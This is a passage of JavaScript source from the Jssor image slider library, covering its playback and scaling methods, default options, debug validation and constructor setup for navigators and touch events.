                $Jssor$.$CssPosition(slideElmt, "absolute");
                $Jssor$.$CssOverflow(slideElmt, "hidden");

                $Jssor$.$HideElement(slideElmt);
            });

            $Jssor$.$SetStyles(_LoadingContainer, _StyleDef);
        }

        function PlayToOffset(offset, slideDuration) {
            PlayTo(offset, slideDuration, true);
        }

        function PlayTo(slideIndex, slideDuration, relative) {
            ///	<summary>
            ///		PlayTo( slideIndex [, slideDuration] ); //Play slider to position 'slideIndex' within a period calculated base on 'slideDuration'.
            ///	</summary>
            ///	<param name="slideIndex" type="Number">
            ///		slide slideIndex or position will be playing to
            ///	</param>
            ///	<param name="slideDuration" type="Number" optional="true">
            ///		base slide duration in milliseconds to calculate the whole duration to complete this play request.
            ///	    default value is '$SlideDuration' value which is specified when initialize the slider.
            ///	</param>
            /// http://msdn.microsoft.com/en-us/library/vstudio/bb385682.aspx
            /// http://msdn.microsoft.com/en-us/library/vstudio/hh542720.aspx
            if (_CarouselEnabled && (!_IsDragging || _Options.$NaviQuitDrag)) {
                _IsSliding = true;
                _IsDragging = false;
                _CarouselPlayer.$Stop();

                {
                    //Slide Duration
                    if (slideDuration == undefined)
                        slideDuration = _SlideDuration;

                    var positionDisplay = _Carousel.$GetPosition_Display();
                    var positionTo = slideIndex;
                    if (relative) {
                        positionTo = positionDisplay + slideIndex;
                        if (slideIndex > 0)
                            positionTo = Math.ceil(positionTo);
                        else
                            positionTo = Math.floor(positionTo);
                    }


                    if (!(_Loop & 1)) {
                        positionTo = GetRealIndex(positionTo);
                        positionTo = Math.max(0, Math.min(positionTo, _SlideCount - _DisplayPieces));
                    }

                    var positionOffset = (positionTo - positionDisplay) % _SlideCount;
                    positionTo = positionDisplay + positionOffset;

                    var duration = positionDisplay == positionTo ? 0 : slideDuration * Math.abs(positionOffset);
                    duration = Math.min(duration, slideDuration * _DisplayPieces * 1.5);

                    _CarouselPlayer.$PlayCarousel(positionDisplay, positionTo, duration || 1);
                }
            }
        }

        //private functions

        //member functions

        _SelfSlider.$PlayTo = PlayTo;

        _SelfSlider.$GoTo = function (slideIndex) {
            ///	<summary>
            ///		instance.$GoTo( slideIndex );   //Go to the specifed slide immediately with no play.
            ///	</summary>
            PlayTo(slideIndex, 1);
        };

        _SelfSlider.$Next = function () {
            ///	<summary>
            ///		instance.$Next();   //Play the slider to next slide.
            ///	</summary>
            PlayToOffset(1);
        };

        _SelfSlider.$Prev = function () {
            ///	<summary>
            ///		instance.$Prev();   //Play the slider to previous slide.
            ///	</summary>
            PlayToOffset(-1);
        };

        _SelfSlider.$Pause = function () {
            ///	<summary>
            ///		instance.$Pause();   //Pause the slider, prevent it from auto playing.
            ///	</summary>
            _AutoPlay = false;
        };

        _SelfSlider.$Play = function () {
            ///	<summary>
            ///		instance.$Play();   //Start auto play if the slider is currently paused.
            ///	</summary>
            if (!_AutoPlay) {
                _AutoPlay = true;
                _SlideItems[_CurrentSlideIndex] && _SlideItems[_CurrentSlideIndex].$TryActivate();
            }
        };

        _SelfSlider.$SetSlideshowTransitions = function (transitions) {
            ///	<summary>
            ///		instance.$SetSlideshowTransitions( transitions );   //Reset slideshow transitions for the slider.
            ///	</summary>
            $JssorDebug$.$Execute(function () {
                if (!transitions || !transitions.length) {
                    $JssorDebug$.$Error("Can not set slideshow transitions, no transitions specified.");
                }
            });

            $Jssor$.$TranslateTransitions(transitions);    //for old transition compatibility
            _Options.$SlideshowOptions.$Transitions = transitions;
        };

        _SelfSlider.$SetCaptionTransitions = function (transitions) {
            ///	<summary>
            ///		instance.$SetCaptionTransitions( transitions );   //Reset caption transitions for the slider.
            ///	</summary>
            $JssorDebug$.$Execute(function () {
                if (!transitions || !transitions.length) {
                    $JssorDebug$.$Error("Can not set caption transitions, no transitions specified");
                }
            });

            $Jssor$.$TranslateTransitions(transitions);    //for old transition compatibility
            _CaptionSliderOptions.$CaptionTransitions = transitions;
            _CaptionSliderOptions.$Version = $Jssor$.$GetNow();
        };

        _SelfSlider.$SlidesCount = function () {
            ///	<summary>
            ///		instance.$SlidesCount();   //Retrieve slides count of the slider.
            ///	</summary>
            return _SlideElmts.length;
        };

        _SelfSlider.$CurrentIndex = function () {
            ///	<summary>
            ///		instance.$CurrentIndex();   //Retrieve current slide index of the slider.
            ///	</summary>
            return _CurrentSlideIndex;
        };

        _SelfSlider.$IsAutoPlaying = function () {
            ///	<summary>
            ///		instance.$IsAutoPlaying();   //Retrieve auto play status of the slider.
            ///	</summary>
            return _AutoPlay;
        };

        _SelfSlider.$IsDragging = function () {
            ///	<summary>
            ///		instance.$IsDragging();   //Retrieve drag status of the slider.
            ///	</summary>
            return _IsDragging;
        };

        _SelfSlider.$IsSliding = function () {
            ///	<summary>
            ///		instance.$IsSliding();   //Retrieve right<-->left sliding status of the slider.
            ///	</summary>
            return _IsSliding;
        };

        _SelfSlider.$IsMouseOver = function () {
            ///	<summary>
            ///		instance.$IsMouseOver();   //Retrieve mouse over status of the slider.
            ///	</summary>
            return !_NotOnHover;
        };

        _SelfSlider.$LastDragSucceded = function () {
            ///	<summary>
            ///		instance.$IsLastDragSucceded();   //Retrieve last drag succeded status, returns 0 if failed, returns drag offset if succeded
            ///	</summary>
            return _LastDragSucceded;
        };

        function OriginalWidth() {
            ///	<summary>
            ///		instance.$OriginalWidth();   //Retrieve original width of the slider.
            ///	</summary>
            return $Jssor$.$CssWidth(_ScaleWrapper || elmt);
        }

        function OriginalHeight() {
            ///	<summary>
            ///		instance.$OriginalHeight();   //Retrieve original height of the slider.
            ///	</summary>
            return $Jssor$.$CssHeight(_ScaleWrapper || elmt);
        }

        _SelfSlider.$OriginalWidth = _SelfSlider.$GetOriginalWidth = OriginalWidth;

        _SelfSlider.$OriginalHeight = _SelfSlider.$GetOriginalHeight = OriginalHeight;

        function Scale(dimension, isHeight) {
            ///	<summary>
            ///		instance.$ScaleWidth();   //Retrieve scaled dimension the slider currently displays.
            ///		instance.$ScaleWidth( dimension );   //Scale the slider to new width and keep aspect ratio.
            ///	</summary>

            if (dimension == undefined)
                return $Jssor$.$CssWidth(elmt);

            $JssorDebug$.$Execute(function () {
                if (!dimension || dimension < 0) {
                    $JssorDebug$.$Fail("'$ScaleWidth' error, 'dimension' should be positive value.");
                }
            });

            if (!_ScaleWrapper) {
                $JssorDebug$.$Execute(function () {
                    var originalWidthStr = $Jssor$.$Css(elmt, "width");
                    var originalHeightStr = $Jssor$.$Css(elmt, "height");
                    var originalWidth = $Jssor$.$CssP(elmt, "width");
                    var originalHeight = $Jssor$.$CssP(elmt, "height");

                    if (!originalWidthStr) {
                        $JssorDebug$.$Fail("Cannot scale jssor slider, 'dimension' of 'outer container' not specified. Please specify 'dimension' in pixel. e.g. 'dimension: 600px;'");
                    }

                    if (!originalHeightStr) {
                        $JssorDebug$.$Fail("Cannot scale jssor slider, 'height' of 'outer container' not specified. Please specify 'height' in pixel. e.g. 'height: 300px;'");
                    }

                    if (originalWidthStr.indexOf('%') != -1) {
                        $JssorDebug$.$Fail("Cannot scale jssor slider, 'dimension' of 'outer container' not valid. Please specify 'dimension' in pixel. e.g. 'dimension: 600px;'");
                    }

                    if (originalHeightStr.indexOf('%') != -1) {
                        $JssorDebug$.$Fail("Cannot scale jssor slider, 'height' of 'outer container' not valid. Please specify 'height' in pixel. e.g. 'height: 300px;'");
                    }

                    if (!originalWidth) {
                        $JssorDebug$.$Fail("Cannot scale jssor slider, 'dimension' of 'outer container' not valid. 'dimension' of 'outer container' should be positive number. e.g. 'dimension: 600px;'");
                    }

                    if (!originalHeight) {
                        $JssorDebug$.$Fail("Cannot scale jssor slider, 'height' of 'outer container' not valid. 'height' of 'outer container' should be positive number. e.g. 'height: 300px;'");
                    }
                });

                var innerWrapper = $Jssor$.$CreateDiv(document);
                $Jssor$.$CssCssText(innerWrapper, $Jssor$.$CssCssText(elmt));
                $Jssor$.$ClassName(innerWrapper, $Jssor$.$ClassName(elmt));

                $Jssor$.$CssPosition(innerWrapper, "relative");
                $Jssor$.$CssTop(innerWrapper, 0);
                $Jssor$.$CssLeft(innerWrapper, 0);
                $Jssor$.$CssOverflow(innerWrapper, "visible");

                _ScaleWrapper = $Jssor$.$CreateDiv(document);

                $Jssor$.$CssPosition(_ScaleWrapper, "absolute");
                $Jssor$.$CssTop(_ScaleWrapper, 0);
                $Jssor$.$CssLeft(_ScaleWrapper, 0);
                $Jssor$.$CssWidth(_ScaleWrapper, $Jssor$.$CssWidth(elmt));
                $Jssor$.$CssHeight(_ScaleWrapper, $Jssor$.$CssHeight(elmt));
                $Jssor$.$SetStyleTransformOrigin(_ScaleWrapper, "0 0");

                $Jssor$.$AppendChild(_ScaleWrapper, innerWrapper);

                var children = $Jssor$.$Children(elmt);
                $Jssor$.$AppendChild(elmt, _ScaleWrapper);

                $Jssor$.$Css(elmt, "backgroundImage", "");

                var noMoveElmts = {
                    "navigator": _BulletNavigatorOptions && _BulletNavigatorOptions.$Scale == false,
                    "arrowleft": _ArrowNavigatorOptions && _ArrowNavigatorOptions.$Scale == false,
                    "arrowright": _ArrowNavigatorOptions && _ArrowNavigatorOptions.$Scale == false,
                    "thumbnavigator": _ThumbnailNavigatorOptions && _ThumbnailNavigatorOptions.$Scale == false,
                    "thumbwrapper": _ThumbnailNavigatorOptions && _ThumbnailNavigatorOptions.$Scale == false
                };

                $Jssor$.$Each(children, function (child) {
                    $Jssor$.$AppendChild(noMoveElmts[$Jssor$.$AttributeEx(child, "u")] ? elmt : innerWrapper, child);
                });

                $Jssor$.$ShowElement(innerWrapper);
                $Jssor$.$ShowElement(_ScaleWrapper);
            }

            $JssorDebug$.$Execute(function () {
                if (!_InitialScrollWidth) {
                    _InitialScrollWidth = _SelfSlider.$Elmt.scrollWidth;
                }
            });

            _ScaleRatio = dimension /  (isHeight? $Jssor$.$CssHeight : $Jssor$.$CssWidth)(_ScaleWrapper);
            $Jssor$.$CssScale(_ScaleWrapper, _ScaleRatio);

            var scaleWidth = isHeight ? (_ScaleRatio * OriginalWidth()) : dimension;
            var scaleHeight = isHeight ? dimension : (_ScaleRatio * OriginalHeight());

            $Jssor$.$CssWidth(elmt, scaleWidth);
            $Jssor$.$CssHeight(elmt, scaleHeight);

            $Jssor$.$Each(_Navigators, function (navigator) {
                navigator.$Relocate(scaleWidth, scaleHeight);
            });
        }

        _SelfSlider.$ScaleHeight = _SelfSlider.$GetScaleHeight = function (height) {
            ///	<summary>
            ///		instance.$ScaleHeight();   //Retrieve scaled height the slider currently displays.
            ///		instance.$ScaleHeight( dimension );   //Scale the slider to new height and keep aspect ratio.
            ///	</summary>

            if (height == undefined)
                return $Jssor$.$CssHeight(elmt);

            Scale(height, true);
        };

        _SelfSlider.$ScaleWidth = _SelfSlider.$SetScaleWidth = _SelfSlider.$GetScaleWidth = Scale;

        _SelfSlider.$GetVirtualIndex = function (index) {
            var parkingIndex = Math.ceil(GetRealIndex(_ParkingPosition / _StepLength));
            var displayIndex = GetRealIndex(index - _CurrentSlideIndex + parkingIndex);

            if (displayIndex > _DisplayPieces) {
                if (index - _CurrentSlideIndex > _SlideCount / 2)
                    index -= _SlideCount;
                else if (index - _CurrentSlideIndex <= -_SlideCount / 2)
                    index += _SlideCount;
            }
            else {
                index = _CurrentSlideIndex + displayIndex - parkingIndex;
            }

            return index;
        };

        //member functions

        $JssorObject$.call(_SelfSlider);

        $JssorDebug$.$Execute(function () {
            var outerContainerElmt = $Jssor$.$GetElement(elmt);
            if (!outerContainerElmt)
                $JssorDebug$.$Fail("Outer container '" + elmt + "' not found.");
        });

        //initialize member variables
        _SelfSlider.$Elmt = elmt = $Jssor$.$GetElement(elmt);
        //initialize member variables

        var _InitialScrollWidth;    //for debug only
        var _CaptionSliderCount = 1;    //for debug only

        var _Options = $Jssor$.$Extend({
            $FillMode: 0,                   //[Optional] The way to fill image in slide, 0 stretch, 1 contain (keep aspect ratio and put all inside slide), 2 cover (keep aspect ratio and cover whole slide), 4 actual size, 5 contain for large image, actual size for small image, default value is 0
            $LazyLoading: 1,                //[Optional] For image with  lazy loading format (<IMG src2="url" .../>), by default it will be loaded only when the slide comes.
            //But an integer value (maybe 0, 1, 2 or 3) indicates that how far of nearby slides should be loaded immediately as well, default value is 1.
            $StartIndex: 0,                 //[Optional] Index of slide to display when initialize, default value is 0
            $AutoPlay: false,               //[Optional] Whether to auto play, default value is false
            $Loop: 1,                       //[Optional] Enable loop(circular) of carousel or not, 0: stop, 1: loop, 2 rewind, default value is 1
            $HWA: true,                     //[Optional] Enable hardware acceleration or not, default value is true
            $NaviQuitDrag: true,
            $AutoPlaySteps: 1,              //[Optional] Steps to go of every play (this options applys only when slideshow disabled), default value is 1
            $AutoPlayInterval: 3000,        //[Optional] Interval to play next slide since the previous stopped if a slideshow is auto playing, default value is 3000
            $PauseOnHover: 1,               //[Optional] Whether to pause when mouse over if a slider is auto playing, 0 no pause, 1 pause for desktop, 2 pause for touch device, 3 pause for desktop and touch device, 4 freeze for desktop, 8 freeze for touch device, 12 freeze for desktop and touch device, default value is 1

            $SlideDuration: 500,            //[Optional] Specifies default duration (swipe) for slide in milliseconds, default value is 400
            $SlideEasing: $JssorEasing$.$EaseOutQuad,   //[Optional] Specifies easing for right to left animation, default value is $JssorEasing$.$EaseOutQuad
            $MinDragOffsetToSlide: 20,      //[Optional] Minimum drag offset that trigger slide, default value is 20
            $SlideSpacing: 0, 				//[Optional] Space between each slide in pixels, default value is 0
            $DisplayPieces: 1,              //[Optional] Number of pieces to display (the slideshow would be disabled if the value is set to greater than 1), default value is 1
            $ParkingPosition: 0,            //[Optional] The offset position to park slide (this options applys only when slideshow disabled), default value is 0.
            $UISearchMode: 1,               //[Optional] The way (0 parellel, 1 recursive, default value is recursive) to search UI components (slides container, loading screen, navigator container, arrow navigator container, thumbnail navigator container etc.
            $PlayOrientation: 1,            //[Optional] Orientation to play slide (for auto play, navigation), 1 horizental, 2 vertical, 5 horizental reverse, 6 vertical reverse, default value is 1
            $DragOrientation: 1             //[Optional] Orientation to drag slide, 0 no drag, 1 horizental, 2 vertical, 3 both, default value is 1 (Note that the $DragOrientation should be the same as $PlayOrientation when $DisplayPieces is greater than 1, or parking position is not 0)

        }, options);

        //Sodo statement for development time intellisence only
        $JssorDebug$.$Execute(function () {
            _Options = $Jssor$.$Extend({
                $ArrowKeyNavigation: undefined,
                $SlideWidth: undefined,
                $SlideHeight: undefined,
                $SlideshowOptions: undefined,
                $CaptionSliderOptions: undefined,
                $BulletNavigatorOptions: undefined,
                $ArrowNavigatorOptions: undefined,
                $ThumbnailNavigatorOptions: undefined
            },
            _Options);
        });

        var _PlayOrientation = _Options.$PlayOrientation & 3;
        var _PlayReverse = (_Options.$PlayOrientation & 4) / -4 || 1;

        var _SlideshowOptions = _Options.$SlideshowOptions;
        var _CaptionSliderOptions = $Jssor$.$Extend({ $Class: $JssorCaptionSliderBase$, $PlayInMode: 1, $PlayOutMode: 1 }, _Options.$CaptionSliderOptions);
        $Jssor$.$TranslateTransitions(_CaptionSliderOptions.$CaptionTransitions); //for old transition compatibility
        var _BulletNavigatorOptions = _Options.$BulletNavigatorOptions;
        var _ArrowNavigatorOptions = _Options.$ArrowNavigatorOptions;
        var _ThumbnailNavigatorOptions = _Options.$ThumbnailNavigatorOptions;

        $JssorDebug$.$Execute(function () {
            if (_SlideshowOptions && !_SlideshowOptions.$Class) {
                $JssorDebug$.$Fail("Option $SlideshowOptions error, class not specified.");
            }
        });

        $JssorDebug$.$Execute(function () {
            if (_Options.$CaptionSliderOptions && !_Options.$CaptionSliderOptions.$Class) {
                $JssorDebug$.$Fail("Option $CaptionSliderOptions error, class not specified.");
            }
        });

        $JssorDebug$.$Execute(function () {
            if (_BulletNavigatorOptions && !_BulletNavigatorOptions.$Class) {
                $JssorDebug$.$Fail("Option $BulletNavigatorOptions error, class not specified.");
            }
        });

        $JssorDebug$.$Execute(function () {
            if (_ArrowNavigatorOptions && !_ArrowNavigatorOptions.$Class) {
                $JssorDebug$.$Fail("Option $ArrowNavigatorOptions error, class not specified.");
            }
        });

        $JssorDebug$.$Execute(function () {
            if (_ThumbnailNavigatorOptions && !_ThumbnailNavigatorOptions.$Class) {
                $JssorDebug$.$Fail("Option $ThumbnailNavigatorOptions error, class not specified.");
            }
        });

        var _UISearchNoDeep = !_Options.$UISearchMode;
        var _ScaleWrapper;
        var _SlidesContainer = $Jssor$.$FindChild(elmt, "slides", _UISearchNoDeep);
        var _LoadingContainer = $Jssor$.$FindChild(elmt, "loading", _UISearchNoDeep) || $Jssor$.$CreateDiv(document);

        var _BulletNavigatorContainer = $Jssor$.$FindChild(elmt, "navigator", _UISearchNoDeep);

        var _ArrowLeft = $Jssor$.$FindChild(elmt, "arrowleft", _UISearchNoDeep);
        var _ArrowRight = $Jssor$.$FindChild(elmt, "arrowright", _UISearchNoDeep);

        var _ThumbnailNavigatorContainer = $Jssor$.$FindChild(elmt, "thumbnavigator", _UISearchNoDeep);

        $JssorDebug$.$Execute(function () {
            //if (_BulletNavigatorOptions && !_BulletNavigatorContainer) {
            //    throw new Error("$BulletNavigatorOptions specified but bullet navigator container (<div u=\"navigator\" ...) not defined.");
            //}
            if (_BulletNavigatorContainer && !_BulletNavigatorOptions) {
                throw new Error("Bullet navigator container defined but $BulletNavigatorOptions not specified.");
            }

            //if (_ArrowNavigatorOptions) {
            //    if (!_ArrowLeft) {
            //        throw new Error("$ArrowNavigatorOptions specified, but arrowleft (<span u=\"arrowleft\" ...) not defined.");
            //    }

            //    if (!_ArrowRight) {
            //        throw new Error("$ArrowNavigatorOptions specified, but arrowright (<span u=\"arrowright\" ...) not defined.");
            //    }
            //}

            if ((_ArrowLeft || _ArrowRight) && !_ArrowNavigatorOptions) {
                throw new Error("arrowleft or arrowright defined, but $ArrowNavigatorOptions not specified.");
            }

            //if (_ThumbnailNavigatorOptions && !_ThumbnailNavigatorContainer) {
            //    throw new Error("$ThumbnailNavigatorOptions specified, but thumbnail navigator container (<div u=\"thumbnavigator\" ...) not defined.");
            //}

            if (_ThumbnailNavigatorContainer && !_ThumbnailNavigatorOptions) {
                throw new Error("Thumbnail navigator container defined, but $ThumbnailNavigatorOptions not specified.");
            }
        });

        var _SlidesContainerWidth = $Jssor$.$CssWidth(_SlidesContainer);
        var _SlidesContainerHeight = $Jssor$.$CssHeight(_SlidesContainer);

        $JssorDebug$.$Execute(function () {
            if (isNaN(_SlidesContainerWidth))
                $JssorDebug$.$Fail("Width of slides container wrong specification, it should be specified in pixel (like style='width: 600px;').");

            if (_SlidesContainerWidth == undefined)
                $JssorDebug$.$Fail("Width of slides container not specified, it should be specified in pixel (like style='width: 600px;').");

            if (isNaN(_SlidesContainerHeight))
                $JssorDebug$.$Fail("Height of slides container wrong specification, it should be specified in pixel (like style='height: 300px;').");

            if (_SlidesContainerHeight == undefined)
                $JssorDebug$.$Fail("Height of slides container not specified, it should be specified in pixel (like style='height: 300px;').");

            var slidesContainerOverflow = $Jssor$.$CssOverflow(_SlidesContainer);
            var slidesContainerOverflowX = $Jssor$.$Css(_SlidesContainer, "overflowX");
            var slidesContainerOverflowY = $Jssor$.$Css(_SlidesContainer, "overflowY");
            if (slidesContainerOverflow != "hidden" && (slidesContainerOverflowX != "hidden" || slidesContainerOverflowY != "hidden"))
                $JssorDebug$.$Fail("Overflow of slides container wrong specification, it should be specified as 'hidden' (style='overflow:hidden;').");

            //var slidesContainerTop = $Jssor$.$CssTop(_SlidesContainer);
            //var slidesContainerLeft = $Jssor$.$CssLeft(_SlidesContainer);

            //if (isNaN(slidesContainerTop))
            //    $JssorDebug$.$Fail("Top of slides container wrong specification, it should be specified in pixel (like style='top: 0px;').");

            //if (slidesContainerTop == undefined)
            //    $JssorDebug$.$Fail("Top of slides container not specified, it should be specified in pixel (like style='top: 0px;').");

            //if (isNaN(slidesContainerLeft))
            //    $JssorDebug$.$Fail("Left of slides container wrong specification, it should be specified in pixel (like style='left: 0px;').");

            //if (slidesContainerLeft == undefined)
            //    $JssorDebug$.$Fail("Left of slides container not specified, it should be specified in pixel (like style='left: 0px;').");
        });

        $JssorDebug$.$Execute(function () {
            if (!$Jssor$.$IsNumeric(_Options.$DisplayPieces))
                $JssorDebug$.$Fail("Option $DisplayPieces error, it should be a numeric value and greater than or equal to 1.");

            if (_Options.$DisplayPieces < 1)
                $JssorDebug$.$Fail("Option $DisplayPieces error, it should be greater than or equal to 1.");

            if (_Options.$DisplayPieces > 1 && _Options.$DragOrientation && _Options.$DragOrientation != _PlayOrientation)
                $JssorDebug$.$Fail("Option $DragOrientation error, it should be 0 or the same of $PlayOrientation when $DisplayPieces is greater than 1.");

            if (!$Jssor$.$IsNumeric(_Options.$ParkingPosition))
                $JssorDebug$.$Fail("Option $ParkingPosition error, it should be a numeric value.");

            if (_Options.$ParkingPosition && _Options.$DragOrientation && _Options.$DragOrientation != _PlayOrientation)
                $JssorDebug$.$Fail("Option $DragOrientation error, it should be 0 or the same of $PlayOrientation when $ParkingPosition is not equal to 0.");
        });

        var _StyleDef;

        var _SlideElmts = [];

        {
            var slideElmts = $Jssor$.$Children(_SlidesContainer);
            $Jssor$.$Each(slideElmts, function (slideElmt) {
                if (slideElmt.tagName == "DIV" && !$Jssor$.$AttributeEx(slideElmt, "u")) {
                    _SlideElmts.push(slideElmt);
                }
            });
        }

        $JssorDebug$.$Execute(function () {
            if (_SlideElmts.length < 1) {
                $JssorDebug$.$Error("Slides html code definition error, there must be at least 1 slide to initialize a slider.");
            }
        });

        var _SlideItemCreatedCount = 0; //for debug only
        var _SlideItemReleasedCount = 0;    //for debug only

        var _PreviousSlideIndex;
        var _CurrentSlideIndex = -1;
        var _TempSlideIndex;
        var _PrevSlideItem;
        var _CurrentSlideItem;
        var _SlideCount = _SlideElmts.length;

        var _SlideWidth = _Options.$SlideWidth || _SlidesContainerWidth;
        var _SlideHeight = _Options.$SlideHeight || _SlidesContainerHeight;

        var _SlideSpacing = _Options.$SlideSpacing;
        var _StepLengthX = _SlideWidth + _SlideSpacing;
        var _StepLengthY = _SlideHeight + _SlideSpacing;
        var _StepLength = (_PlayOrientation & 1) ? _StepLengthX : _StepLengthY;
        var _DisplayPieces = Math.min(_Options.$DisplayPieces, _SlideCount);

        var _SlideshowPanel;
        var _CurrentBoardIndex = 0;
        var _DragOrientation;
        var _DragOrientationRegistered;
        var _DragInvalid;

        var _HandleTouchEventOnly;
        var _IsTouchDevice;

        var _Navigators = [];
        var _BulletNavigator;
        var _ArrowNavigator;
        var _ThumbnailNavigator;

        var _ShowLink;

        var _Frozen;
        var _AutoPlay;
        var _AutoPlaySteps = _Options.$AutoPlaySteps;
        var _HoverToPause = _Options.$PauseOnHover;
        var _AutoPlayInterval = _Options.$AutoPlayInterval;
        var _SlideDuration = _Options.$SlideDuration;

        var _SlideshowRunnerClass;
        var _TransitionsOrder;

        var _SlideshowEnabled;
        var _ParkingPosition;
        var _CarouselEnabled = _DisplayPieces < _SlideCount;
        var _Loop = _CarouselEnabled ? _Options.$Loop : 0;

        var _DragEnabled;
        var _LastDragSucceded;

        var _NotOnHover = 1;   //0 Hovering, 1 Not hovering

        //Variable Definition
        var _IsSliding;
        var _IsDragging;
        var _LoadingTicket;

        //The X position of mouse/touch when a drag start
        var _DragStartMouseX = 0;
        //The Y position of mouse/touch when a drag start
        var _DragStartMouseY = 0;
        var _DragOffsetTotal;
        var _DragOffsetLastTime;
        var _DragIndexAdjust;

        var _Carousel;
        var _Conveyor;
        var _Slideshow;
        var _CarouselPlayer;
        var _SlideContainer = new SlideContainer();
        var _ScaleRatio;

        //$JssorSlider$ Constructor
        {
            _AutoPlay = _Options.$AutoPlay;
            _SelfSlider.$Options = options;

            AdjustSlidesContainerSize();

            elmt["jssor-slider"] = true;

            //_SlideshowPanel = CreatePanel();
            //$Jssor$.$CssZIndex(elmt, $Jssor$.$CssZIndex(elmt));
            //$Jssor$.$CssLeft(_SlideshowPanel, $Jssor$.$CssLeft(_SlidesContainer));
            //$Jssor$.$CssZIndex(_SlidesContainer, $Jssor$.$CssZIndex(_SlidesContainer));
            //$Jssor$.$CssTop(_SlideshowPanel, $Jssor$.$CssTop(_SlidesContainer));
            $Jssor$.$CssZIndex(_SlidesContainer, $Jssor$.$CssZIndex(_SlidesContainer) || 0);
            $Jssor$.$CssPosition(_SlidesContainer, "absolute");
            _SlideshowPanel = $Jssor$.$CloneNode(_SlidesContainer);
            $Jssor$.$InsertBefore($Jssor$.$ParentNode(_SlidesContainer), _SlideshowPanel, _SlidesContainer);

            if (_SlideshowOptions) {
                _ShowLink = _SlideshowOptions.$ShowLink;
                _SlideshowRunnerClass = _SlideshowOptions.$Class;

                $JssorDebug$.$Execute(function () {
                    if (!_SlideshowOptions.$Transitions || !_SlideshowOptions.$Transitions.length) {
                        $JssorDebug$.$Error("Invalid '$SlideshowOptions', no '$Transitions' specified.");
                    }
                });

                $Jssor$.$TranslateTransitions(_SlideshowOptions.$Transitions); //for old transition compatibility

                _SlideshowEnabled = _DisplayPieces == 1 && _SlideCount > 1 && _SlideshowRunnerClass && (!$Jssor$.$IsBrowserIE() || $Jssor$.$BrowserVersion() >= 8);
            }

            _ParkingPosition = (_SlideshowEnabled || _DisplayPieces >= _SlideCount || !(_Loop & 1)) ? 0 : _Options.$ParkingPosition;

            _DragEnabled = ((_DisplayPieces > 1 || _ParkingPosition) ? _PlayOrientation : -1) & _Options.$DragOrientation;

            //SlideBoard
            var _SlideboardElmt = _SlidesContainer;
            var _SlideItems = [];

            var _SlideshowRunner;
            var _LinkContainer;

            var _DownEvent = "mousedown";
            var _MoveEvent = "mousemove";
            var _UpEvent = "mouseup";
            var _CancelEvent;

            var _LastTimeMoveByDrag;
            var _Position_OnFreeze;
            var _CarouselPlaying_OnFreeze;
            var _PlayToPosition_OnFreeze;
            var _PositionToGoByDrag;

            //SlideBoard Constructor
            {
                var msPrefix;
                if (window.navigator.pointerEnabled || (msPrefix = window.navigator.msPointerEnabled)) {
                    _IsTouchDevice = true;

                    _DownEvent = msPrefix ? "MSPointerDown" : "pointerdown";
                    _MoveEvent = msPrefix ? "MSPointerMove" : "pointermove";
                    _UpEvent = msPrefix ? "MSPointerUp" : "pointerup";
                    _CancelEvent = msPrefix ? "MSPointerCancel" : "pointercancel";

                    if (_DragEnabled) {
                        var touchAction = "auto";
                        if (_DragEnabled == 2) {
                            touchAction = "pan-x";
                        }
                        else if (_DragEnabled) {
                            touchAction = "pan-y";
                        }

                        $Jssor$.$Css(_SlideboardElmt, msPrefix ? "msTouchAction" : "touchAction", touchAction);
                    }
                }
                else if ("ontouchstart" in window || "createTouch" in document) {
                    _HandleTouchEventOnly = true;
                    _IsTouchDevice = true;

                    _DownEvent = "touchstart";
                    _MoveEvent = "touchmove";
                    _UpEvent = "touchend";
                    _CancelEvent = "touchcancel";
                }

                _Slideshow = new Slideshow();

                if (_SlideshowEnabled)
                    _SlideshowRunner = new _SlideshowRunnerClass(_SlideContainer, _SlideWidth, _SlideHeight, _SlideshowOptions, _HandleTouchEventOnly);

                $Jssor$.$AppendChild(_SlideshowPanel, _Slideshow.$Wrapper);
                $Jssor$.$CssOverflow(_SlidesContainer, "hidden");

                //link container
                {
                    _LinkContainer = CreatePanel();
                    $Jssor$.$Css(_LinkContainer, "backgroundColor", "#000");
                    $Jssor$.$CssOpacity(_LinkContainer, 0);
                    $Jssor$.$InsertBefore(_SlideboardElmt, _LinkContainer, _SlideboardElmt.firstChild);
                }

                for (var i = 0; i < _SlideElmts.length; i++) {
                    var slideElmt = _SlideElmts[i];
                    var slideItem = new SlideItem(slideElmt, i);
                    _SlideItems.push(slideItem);
                }

                $Jssor$.$HideElement(_LoadingContainer);

                $JssorDebug$.$Execute(function () {
                    $Jssor$.$Attribute(_LoadingContainer, "debug-id", "loading-container");
                });

                _Carousel = new Carousel()
                _CarouselPlayer = new CarouselPlayer(_Carousel, _Slideshow);

                $JssorDebug$.$Execute(function () {
                    $Jssor$.$Attribute(_SlideboardElmt, "debug-id", "slide-board");
                });

                if (_DragEnabled) {
                    $Jssor$.$AddEvent(_SlidesContainer, _DownEvent, OnMouseDown);
                    $Jssor$.$AddEvent(document, _UpEvent, OnDragEnd);
                    _CancelEvent && $Jssor$.$AddEvent(document, _CancelEvent, OnDragEnd);
                }
            }
            //SlideBoard

            _HoverToPause &= (_IsTouchDevice ? 10 : 5);

            //Bullet Navigator
            if (_BulletNavigatorContainer && _BulletNavigatorOptions) {
                _BulletNavigator = new _BulletNavigatorOptions.$Class(_BulletNavigatorContainer, _BulletNavigatorOptions, OriginalWidth(), OriginalHeight());
                _Navigators.push(_BulletNavigator);
            }

            //Arrow Navigator
            if (_ArrowNavigatorOptions && _ArrowLeft && _ArrowRight) {
                _ArrowNavigator = new _ArrowNavigatorOptions.$Class(_ArrowLeft, _ArrowRight, _ArrowNavigatorOptions, OriginalWidth(), OriginalHeight());
                _Navigators.push(_ArrowNavigator);
            }

            //Thumbnail Navigator
            if (_ThumbnailNavigatorContainer && _ThumbnailNavigatorOptions) {
                _ThumbnailNavigatorOptions.$StartIndex = _Options.$StartIndex;
                _ThumbnailNavigator = new _ThumbnailNavigatorOptions.$Class(_ThumbnailNavigatorContainer, _ThumbnailNavigatorOptions);
                _Navigators.push(_ThumbnailNavigator);
            }

            $Jssor$.$Each(_Navigators, function (navigator) {
                navigator.$Reset(_SlideCount, _SlideItems, _LoadingContainer);
                navigator.$On($JssorNavigatorEvents$.$NAVIGATIONREQUEST, NavigationClickHandler);
            });

            Scale(OriginalWidth());

            $Jssor$.$AddEvent(elmt, "mouseout", $Jssor$.$MouseOverOutFilter(MainContainerMouseLeaveEventHandler, elmt));
